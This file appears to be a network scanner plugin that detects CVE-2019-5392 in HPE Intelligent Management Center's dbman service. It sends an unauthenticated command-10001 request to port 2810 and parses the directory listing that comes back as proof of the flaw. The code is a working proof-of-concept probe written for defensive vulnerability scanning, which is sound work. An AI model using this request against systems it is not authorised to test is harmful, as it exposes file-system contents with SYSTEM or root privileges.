#
# (C) WebRAY Network Security, Inc.
#
include("compat.inc");

if (description)
{
  script_id(118038);
  script_version("1.3");
  script_cvs_date("Date: 2019/06/06  4:35:35");

  script_cve_id("CVE-2019-5392");
  script_xref(name:"TRA", value:"TRA-2018-28");
  script_xref(name:"HP", value:"HPESBHF03930");

  script_name(english:"HPE Intelligent Management Center dbman Command 10001 Information Disclosure");
  script_summary(english:"Attempts to fetch directory contents");

  script_set_attribute(attribute:"synopsis", value:
"A database backup and restoration tool running on the remote host is
affected by an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HPE Intelligent Management Center (iMC) dbman process running
on the remote host is affected by an information disclosure
vulnerability. An unauthenticated, remote attacker can
exploit this, via a command 10001 request, to view the contents of 
arbitrary directories under the security context of the SYSTEM or
root user.

Note that the HPE iMC dbman process running on the remote host is
reportedly affected by additional vulnerabilities; however, this
plugin has not tested for these.");
  # https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbhf03930en_us
  script_set_attribute(attribute:"see_also", value:"");
  script_set_attribute(attribute:"solution", value:
"Upgrade HPE iMC version to 7.3 E0703 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-5392");

  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:intelligent_management_center");
  script_set_attribute(attribute:"exploited_by_GizaNE", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by WebRAY, Inc. or an Affiliate thereof.");
  script_dependencies("hp_imc_dbman_detect.nbin");
  script_require_ports("hpe_imc_dbman",2810);
  exit(0);
}

include('audit.inc');
include('byte_func.inc');
include('global_settings.inc');
include('misc_func.inc');
include('kerberos_func.inc');

###
#
# Read a dbman response
#
# @param socket socket to read from
#
# @return ret['code'] - response code
#         ret['data'] - response data
#         NULL on error
#
###
function dbman_recv(socket)
{
  local_var data, len, ret;

  # Read 4-byte code
  data = recv(socket:socket, length:4, min:4);
  if(isnull(data)) return NULL;
  ret['code'] = getdword(blob:data, pos:0);

  # Read 4-byte msg len
  data = recv(socket:socket, length:4, min:4);
  if(isnull(data)) return NULL;
  len = getdword(blob:data, pos:0);

  # Dubious msg len
  if(len > 0x10000) return NULL;

  # Read msg body
  data = NULL;
  if(len)
  {
    data = recv(socket:socket, length:len, min:len);
    if(isnull(data)) return NULL;
  }
  ret['data'] = data;
  return ret;
}

###
#
# Parse command 10001 response
#
# @anonparam command 10001 response data
#
# @return parsed data
#
###
function get_dir_contents()
{
  local_var data, ent, i, name, out, ret;

  data = _FCT_ANON_ARGS[0];

  # Parse the outer sequence
  ret = der_parse_data(tag:0x30,data:data);
  if(empty_or_null(ret)) return NULL;

  # Parse the embedded sequence, which holds a list of
  # directory entries
  ret = der_parse_sequence(seq:ret,list:TRUE);
  if(empty_or_null(ret)) return NULL;

  # A directory should not have more than 1000 entries
  if(ret[0] > 1000) return NULL;

  out = NULL;
  for (i = 1; i <= ret[0]; i++)
  {
    # Each directory entry is a sequence itself
    ent = ret[i];
    ent = der_parse_sequence(seq:ent,list:TRUE);
    if(empty_or_null(ent)) return NULL;

    # Each entry should have 3 elements 
    if(ent[0] != 3) return NULL;

    # The 'name' element 
    name = der_parse_octet_string(string: ent[1]);
    if(empty_or_null(name)) return NULL;

    out += name + '\n';
  }
  return out;
}

port = get_service(svc:'hpe_imc_dbman', default:2810, exit_on_fail:TRUE);
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_PORT_CLOSED, port);


data = der_encode_int (i:1) + # flag
       # Query the current directory of the dbman process
       der_encode_octet_string(string:".");
opcode = 10001;

seq = der_encode (tag:0x30, data: data);
req = mkdword(opcode) + mkdword(strlen(seq)) + seq;
send(socket: soc, data: req);
res = dbman_recv(socket: soc);
close(soc);

if(! isnull(res) &&
   ! isnull(res['data']) &&
    # The current directory should contain the dbman executable
   'dbman' >< res['data'] &&
    # Corretly extract the directory contents so that we can show
    # to the user that the info disclosure vuln indeed exists.
   !isnull((ret = get_dir_contents(res['data'])))
  )
{
  report =
    'GizaNE was able to get the contents of the current directory of the ' +
    'dbman process: \n' +
    '\n' +
    ret;

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    extra       : report
  );
}
else
{
  audit(AUDIT_HOST_NOT, 'affected');
}
